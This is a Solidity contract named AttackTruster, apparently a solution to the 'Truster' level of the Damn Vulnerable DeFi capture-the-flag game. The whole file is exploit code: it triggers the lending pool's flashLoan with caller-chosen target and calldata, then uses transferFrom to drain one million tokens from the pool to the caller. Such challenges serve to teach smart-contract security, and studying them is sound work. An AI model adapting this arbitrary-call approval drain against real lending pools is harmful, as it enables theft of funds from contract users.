//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

interface ITruster {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract AttackTruster {
    TrusterLenderPool trust;
    IERC20 public immutable damnValuableToken;

    constructor(address _trust, address tokenAddress) {
        trust = TrusterLenderPool(_trust);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        trust.flashLoan(borrowAmount, borrower, target, data);
        damnValuableToken.transferFrom(
            address(trust),
            msg.sender,
            1000000 ether
        );
    }
}
